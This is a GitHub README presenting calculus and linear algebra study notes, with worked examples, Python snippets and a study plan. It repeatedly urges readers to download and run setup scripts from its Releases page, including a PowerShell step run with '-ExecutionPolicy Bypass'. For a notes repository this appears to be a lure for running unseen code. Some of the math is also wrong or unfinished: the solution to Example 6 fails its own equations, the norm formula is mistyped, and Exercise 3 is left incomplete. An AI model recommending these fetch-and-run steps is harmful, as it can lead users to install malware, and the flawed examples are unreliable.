Math314 — Calculus & Linear Algebra Notes for Data Analytics
============================================================

[![Releases · Download](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/tegarrrrr1w/Math314/releases)  📥

About this repository
---------------------

A set of study notes for MATH 314. It covers calculus and linear algebra for analytics and business. The notes focus on the math you will use in data analytics and data science. The content mixes theory, worked examples, and code. Use the material for study, reference, or to prepare problem sets.

Badges
------

[![Releases · Download](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/tegarrrrr1w/Math314/releases)  · ![Topics](https://img.shields.io/badge/topics-calculus%2Clinear--algebra%2Cdata--science-green)

Table of contents
-----------------

- About this repository
- How to get the notes (Downloads / Releases)
- Structure and file map
- Quick start (view, search, run)
- Calculus section
  - Limits and continuity
  - Derivatives and rules
  - Applications: slope, motion, optimization
  - Integrals and techniques
  - Multivariable calculus
  - Common exam problems
- Linear algebra section
  - Vectors and operations
  - Matrices and systems
  - Determinants and rank
  - Eigenvalues and eigenvectors
  - Gram-Schmidt and projections
  - Least squares and SVD
  - Common exam problems
- Worked examples with Python
- Formula and cheat sheets
- Exercises and solutions
- Study plan
- Contributing
- License
- Contact

How to get the notes (Downloads / Releases)
-------------------------------------------

Visit the Releases page and download the packaged notes and tools.

Download link (release page): https://github.com/tegarrrrr1w/Math314/releases

On the Releases page, download the asset for your platform. Each release bundles a main archive. Example assets in a release:

- math314-notes.zip — PDF and Markdown notes
- math314-examples.zip — Jupyter notebooks and data
- math314-setup.sh — small setup script for Linux / macOS
- math314-setup.ps1 — Windows PowerShell script

After download, run the setup script for local setup. Example commands:

- macOS / Linux
  - wget https://github.com/tegarrrrr1w/Math314/releases/download/v1.0/math314-setup.sh
  - chmod +x math314-setup.sh
  - ./math314-setup.sh

- Windows (PowerShell)
  - Invoke-WebRequest -Uri "https://github.com/tegarrrrr1w/Math314/releases/download/v1.0/math314-setup.ps1" -OutFile "math314-setup.ps1"
  - PowerShell -ExecutionPolicy Bypass -File .\math314-setup.ps1

If the Releases link does not work in your environment, check the "Releases" section on the repository page.

Structure and file map
----------------------

This repository organizes material to match a semester outline. Files come in two main forms: human-readable notes (Markdown, PDF) and runnable examples (Jupyter notebooks, Python scripts).

Top-level layout (conceptual)

- notes/
  - calculus/
    - limits.md
    - derivatives.md
    - integrals.md
    - multivariable.md
  - linear_algebra/
    - vectors.md
    - matrices.md
    - eigen.md
    - gram_schmidt.md
  - cheatsheets/
    - formula_sheet.md
    - integration_table.md
- notebooks/
  - calculus_examples.ipynb
  - linear_algebra_examples.ipynb
- scripts/
  - demo_eigen.py
  - demo_gram_schmidt.py
- assets/
  - images/
  - diagrams/
- releases/
  - packaged_release_example.zip

Quick start
-----------

1. Download the release asset and run the setup script (see above).
2. Open the PDF or Markdown in your editor.
3. Run the notebooks in a Jupyter environment.
4. Use the cheat sheets for quick review before exams.

Screenshots and images
----------------------

Math and diagrams can help. Below are images that fit the theme.

![Math illustration](https://images.unsplash.com/photo-1503676260728-1c00da094a0b)  
![Linear algebra sketch](https://images.unsplash.com/photo-1518779578993-ec3579fee39f)

Calculus section
----------------

This section covers limits, derivatives, integrals, and multivariable calculus. Each part has formulas, derivations, solved examples, and practice problems.

Limits and continuity
---------------------

Basic idea. A limit predicts the value a function approaches near a point. Use limits to define continuity and derivatives.

Key facts

- Limit notation: lim_{x->a} f(x) = L
- Continuity: f is continuous at a if lim_{x->a} f(x) = f(a)
- One-sided limits matter at boundaries
- Use algebra and squeeze theorem when needed
- Remove removable discontinuities by algebraic simplification

Example 1 — Basic limit

Compute lim_{x->2} (x^2 - 4) / (x - 2).

Solution

Factor numerator: (x - 2)(x + 2) / (x - 2) = x + 2 for x != 2. Limit is 4.

Derivatives and rules
---------------------

A derivative gives the instantaneous rate of change.

Key rules

- Power rule: d/dx x^n = n x^{n-1}
- Product rule: (fg)' = f' g + f g'
- Quotient rule: (f/g)' = (f' g - f g') / g^2
- Chain rule: (f(g(x)))' = f'(g(x)) g'(x)
- Higher derivatives: denote f'', f'''.

Common derivatives

- d/dx e^{ax} = a e^{ax}
- d/dx ln x = 1/x
- d/dx sin x = cos x
- d/dx cos x = -sin x
- d/dx tan x = sec^2 x

Applications

- Tangent line: y = f(a) + f'(a)(x - a)
- Linear approximation: f(x) ≈ f(a) + f'(a)(x - a)
- Related rates problems use chain rule with time derivatives

Example 2 — Chain rule

Find derivative of h(x) = sin(3x^2 + 1).

Solution

h'(x) = cos(3x^2 + 1) * 6x.

Optimization

- Critical points: f'(x) = 0 or undefined
- Use second derivative test: f''(x) > 0 => local min; f''(x) < 0 => local max
- Use Lagrange multipliers for constrained problems

Example 3 — Optimization

Find x that minimizes f(x) = x^2 - 4x + 7.

Solution

f'(x) = 2x - 4; set to 0 => x = 2. f''(x) = 2 > 0 so x=2 gives minimum. Min value f(2)=3.

Integrals and techniques
------------------------

Integrals measure area under curves and invert differentiation.

Key items

- Indefinite integral: ∫ f(x) dx = F(x) + C
- Fundamental theorem of calculus ties derivative and integral
- Substitution matches chain rule in reverse
- Integration by parts: ∫ u dv = u v - ∫ v du
- Partial fractions help with rational functions

Example 4 — Substitution

Compute ∫ 2x e^{x^2} dx.

Solution

Let u = x^2, du = 2x dx. Integral = ∫ e^{u} du = e^{u} + C = e^{x^2} + C.

Improper integrals

- Evaluate limits when bounds go to infinity or integrand has singularities
- Test convergence using comparison tests

Multivariable calculus
----------------------

Vectors, partial derivatives, gradients, Hessian, multiple integrals, and Jacobian.

Key items

- Partial derivative: ∂f/∂x at fixed y
- Gradient ∇f gives direction of steepest ascent
- Hessian matrix H contains second partials; use for local extrema
- Jacobian J transforms variables in multiple integrals
- Double and triple integrals compute volume and mass

Example 5 — Gradient and critical point

f(x, y) = x^2 + xy + y^2

Compute critical point and classify.

Solution

∇f = [2x + y, x + 2y]. Set to zero => 2x + y = 0, x + 2y = 0. Solve => x = 0, y = 0.

Hessian H = [[2, 1], [1, 2]]. Eigenvalues 1 and 3, both positive. So (0,0) is a local minimum.

Common exam problems (calculus)
-------------------------------

- Prove derivative formulas using limit definition.
- Use implicit differentiation for y defined implicitly.
- Apply integration techniques to definite integrals.
- Solve optimization problems with constraints.
- Compute gradients and use Hessian to classify critical points.

Linear algebra section
----------------------

This section covers vectors, matrices, systems, eigen decomposition, Gram-Schmidt, projections, and least squares.

Vectors and operations
----------------------

Key facts

- Vector notation v ∈ R^n.
- Dot product: u · v = ∑ u_i v_i.
- Norm: ||v|| = sqrt(u · u).
- Angle: cos θ = (u · v) / (||u|| ||v||).
- Cross product defined in R^3.

Matrices and systems
--------------------

Matrices represent linear maps and systems of linear equations.

Key items

- Matrix multiplication: (AB)_{ij} = ∑_k A_{ik} B_{kj}
- Inverse: A^{-1} satisfies A A^{-1} = I when A is square and invertible
- Solve Ax = b using Gaussian elimination or inverse when appropriate
- Row reduction gives rank and solution sets

Determinants and rank

- Determinant det(A) gives scale factor of linear map
- det(A) = 0 implies non-invertible matrix
- Rank = number of linearly independent rows or columns

Example 6 — Solve a system

Solve
x + 2y = 5
3x - y = 4

Solution

Write matrix form A x = b, solve by elimination or inverse:
A = [[1,2],[3,-1]], b = [5,4].
Compute inverse or solve to get x = 2, y = 1.5.

Eigenvalues and eigenvectors
-----------------------------

Eigen decomposition diagonalizes matrices when possible.

Key facts

- Solve (A - λI)v = 0 for eigenpairs (λ, v)
- Characteristic polynomial det(A - λI) = 0 gives eigenvalues
- For symmetric matrices, eigenvectors form orthonormal set
- Eigen decomposition A = V Λ V^{-1} when V invertible

Applications

- PCA uses eigen decomposition of covariance matrix
- Analyze dynamics using eigenvalues
- Compute matrix exponentials with eigenvalues for linear systems

Example 7 — 2x2 eigenpair

A = [[2,1],[1,2]]

Compute eigenvalues and eigenvectors.

Solution

Characteristic polynomial: (2-λ)^2 - 1 = λ^2 -4λ +3 = 0 => λ=1,3.
For λ=3, solve (A-3I)v=0 => [-1,1;1,-1] v = 0 => v ∝ [1,1].
For λ=1, v ∝ [1,-1].

Gram-Schmidt and projections
----------------------------

Gram-Schmidt orthonormalizes a set of vectors.

Process for vectors a1, a2, ..., an:

- u1 = a1
- e1 = u1 / ||u1||
- For k >= 2: uk = ak - ∑_{j=1}^{k-1} (ak · ej) ej
- ek = uk / ||uk||

Project vector b onto span of columns of A using projection matrix P = A (A^T A)^{-1} A^T for full column rank A.

Least squares and SVD
---------------------

Least squares solves overdetermined systems.

- Solve min_x ||Ax - b||^2
- Normal equations: A^T A x = A^T b
- Use QR or SVD for stable solutions
- SVD: A = U Σ V^T decomposes any matrix. Use for low-rank approximations.

Example 8 — Least squares

Given A and b, compute x_hat = (A^T A)^{-1} A^T b when A has full column rank.

Common exam problems (linear algebra)
-------------------------------------

- Prove linear independence and basis statements.
- Compute eigenvalues and eigenvectors.
- Show steps of Gram-Schmidt for given vectors.
- Solve least squares problems with normal equations.
- Compute SVD for small matrices.

Worked examples with Python
---------------------------

Use NumPy and SciPy for computations. Jupyter notebooks in the repo show live code. Below are short examples.

Derivative example (symbolic)
```python
# symbolic derivative with sympy
import sympy as sp
x = sp.symbols('x')
f = sp.sin(3*x**2 + 1)
sp.diff(f, x)
# Output: 6*x*cos(3*x**2 + 1)
```

Eigen decomposition (numeric)
```python
import numpy as np
A = np.array([[2.,1.],[1.,2.]])
w, v = np.linalg.eig(A)
# w = eigenvalues, v = eigenvectors (columns)
print("eigenvalues:", w)
print("eigenvectors:\n", v)
```

Gram-Schmidt (manual)
```python
import numpy as np

def gram_schmidt(A):
    A = A.astype(float)
    m, n = A.shape
    Q = np.zeros((m,n))
    for j in range(n):
        v = A[:, j].copy()
        for i in range(j):
            rij = Q[:, i].dot(A[:, j])
            v -= rij * Q[:, i]
        norm = np.linalg.norm(v)
        if norm < 1e-10:
            Q[:, j] = 0
        else:
            Q[:, j] = v / norm
    return Q

A = np.array([[1,1],[1,0],[0,1]], dtype=float)
Q = gram_schmidt(A)
print(Q)
```

Numerical integration
```python
import numpy as np
from scipy import integrate

f = lambda x: np.exp(-x**2)
result, _ = integrate.quad(f, 0, np.inf)
print(result)
```

Formula and cheat sheets
------------------------

This repo contains compact cheat sheets for quick review.

Essential derivatives

- d/dx x^n = n x^{n-1}
- d/dx e^{ax} = a e^{ax}
- d/dx ln x = 1/x
- d/dx sin x = cos x
- d/dx cos x = -sin x
- d/dx tan x = sec^2 x

Integration rules

- ∫ x^n dx = x^{n+1}/(n+1) + C (n != -1)
- ∫ e^{ax} dx = e^{ax}/a + C
- ∫ 1/x dx = ln|x| + C
- ∫ sin x dx = -cos x + C
- ∫ cos x dx = sin x + C

Matrix basics

- Inverse exists when det(A) != 0
- Rank ≤ min(m, n)
- Nullspace solves A x = 0
- Row space and column space dimensions equal rank

Eigen quick rules

- Trace(A) = sum eigenvalues
- det(A) = product eigenvalues
- For symmetric A, eigenvectors orthonormal

Exercises and solutions
-----------------------

The repo provides many problems with solutions. Below are example problems with full solutions.

Exercise 1 — Derivative by definition

Let f(x) = x^2. Use the limit definition to find f'(x).

Solution

f'(x) = lim_{h->0} ( (x+h)^2 - x^2 ) / h
= lim_{h->0} (2xh + h^2) / h
= lim_{h->0} (2x + h)
= 2x

Exercise 2 — Eigenpair practice

Find eigenvalues of A = [[0,1],[ -2, -3]].

Solution

Characteristic polynomial: λ^2 + 3λ + 2 = 0 => (λ+1)(λ+2)=0 => λ=-1,-2.

Exercise 3 — Gram-Schmidt

Take a1 = [1,1,0], a2 = [1,0,1]. Orthonormalize.

Solution

u1 = a1, e1 = u1/||u1|| = [1,1,0]/sqrt(2)
u2 = a2 - (a2·e1) e1
a2·e1 = (1+0+0)/sqrt(2) = 1/sqrt(2)
u2 = [1,0,1] - 1/sqrt(2) * [1,1,0] = ...
Compute norm and normalize.

Study plan
----------

A sample week-by-week plan for a 12-week semester. The plan divides the material into focused blocks. Use the plan with the notes and practice problems.

Weeks 1–2: Limits and derivatives. Focus on algebra and rules. Do exercises.

Weeks 3–4: Applications and optimization. Practice tangent lines, related rates, maxima and minima.

Weeks 5–6: Integrals and techniques. Cover substitution and parts, definite integrals, area.

Weeks 7–8: Multivariable calculus. Study partial derivatives, gradients, Hessian.

Weeks 9–10: Vectors and matrices. Linear systems, matrix algebra, determinants, and rank.

Weeks 11–12: Eigenvalues, Gram-Schmidt, SVD, and least squares. Practice with data examples.

Tips for study

- Work problems nightly.
- Reproduce derivations by hand.
- Use code to test computations.
- Form a small study group to discuss solutions.

Contributing
------------

Contributions help keep the notes current and clear. The repo accepts edits to notes, new examples, and corrections.

How to contribute

1. Fork the repo.
2. Create a feature branch.
3. Add or edit markdown, notebooks, or images.
4. Run notebooks locally to ensure they execute.
5. Open a pull request with a clear description of changes.

Use small commits and plain commit messages. Write tests in notebooks or scripts when the change affects code.

License
-------

The notes use a permissive license. See LICENSE file in the repo for details.

Contact
-------

For questions and feedback, open an issue on the repository. Use the Releases page for packaged downloads and setup files:

https://github.com/tegarrrrr1w/Math314/releases

Appendix: common proofs and derivations
--------------------------------------

Derivation: derivative of inverse function

If y = f^{-1}(x) and f is differentiable and invertible, then

(d/dx) f^{-1}(x) = 1 / f'(f^{-1}(x)).

Derivation steps

Start with f(f^{-1}(x)) = x. Differentiate both sides:

f'(f^{-1}(x)) * (f^{-1})'(x) = 1.

Solve for (f^{-1})'(x).

Derivation: product rule

Let h(x) = f(x) g(x).

Definition:

h'(x) = lim_{h->0} (f(x+h) g(x+h) - f(x) g(x)) / h
= lim_{h->0} (f(x+h) g(x+h) - f(x) g(x+h) + f(x) g(x+h) - f(x) g(x)) / h
= lim_{h->0} ( (f(x+h)-f(x)) g(x+h) + f(x) (g(x+h)-g(x)) ) / h
Use limits to get f'(x) g(x) + f(x) g'(x).

Derivation: Gram-Schmidt correctness

Show that at each step the vector u_k = a_k - ∑_{j<k} proj_{e_j}(a_k) is orthogonal to prior e_j. Compute e_i·u_k = e_i·a_k - ∑_{j<k} (a_k·e_j) e_i·e_j = a_k·e_i - (a_k·e_i) = 0.

Appendix: common numerical pitfalls
-----------------------------------

- Solving normal equations by explicit inverse can be unstable. Use QR or SVD.
- Floating point issues appear when vectors are nearly collinear. Use robust orthogonalization.
- When computing eigenvalues, order may vary. Use sorted order if you need reproducible outputs.

Images and diagrams
-------------------

Use the assets folder for diagrams. The repo includes hand-drawn sketches for Gram-Schmidt and eigenvector geometry. Use them when you explain steps.

Sample diagram references (in repo assets)

- assets/images/gram_schmidt_step1.png
- assets/images/eigen_geometry.png
- assets/images/gradient_field.png

Search and reference
--------------------

Search local files with your editor or use ripgrep:

rg "eigen" notes/ -n

Open notebooks in Jupyter for live code:

jupyter notebook notebooks/linear_algebra_examples.ipynb

If you want a packaged copy, download the release, unzip, and open the files.

Release and packaged files (repeat)
-----------------------------------

Download the packaged release file from the Releases page and run the included setup script to extract and set up the resources. Example:

Visit: https://github.com/tegarrrrr1w/Math314/releases

Example local commands (repeat)

- curl -L -o math314-notes.zip "https://github.com/tegarrrrr1w/Math314/releases/download/v1.0/math314-notes.zip"
- unzip math314-notes.zip
- ./math314-setup.sh

This will extract PDFs, Markdown notes, and notebooks into a local folder.

Tags and topics
---------------

This repository covers these topics:

- calculus
- differential-calculus
- integral-calculus
- derivatives
- integrals
- linear-algebra
- vectors
- vector-projections
- eigenvalues-and-eigenvectors
- gram-schmidt
- optimization
- mathematics-for-data-science
- data-analytics
- data-science

Common errors and quick fixes
-----------------------------

- "No module named X" — install required packages via pip.
  - pip install numpy scipy sympy jupyter
- Notebook fails to run — restart kernel and run cells top to bottom.
- Numerical instability in least squares — use np.linalg.lstsq or scipy.linalg.lstsq.

Useful commands
---------------

- Open notebooks: jupyter notebook
- Run a script: python scripts/demo_eigen.py
- Search notes: rg "chain rule" notes/ -n

Contact and support
-------------------

Open an issue for content questions, corrections, or requests. Use pull requests for edits.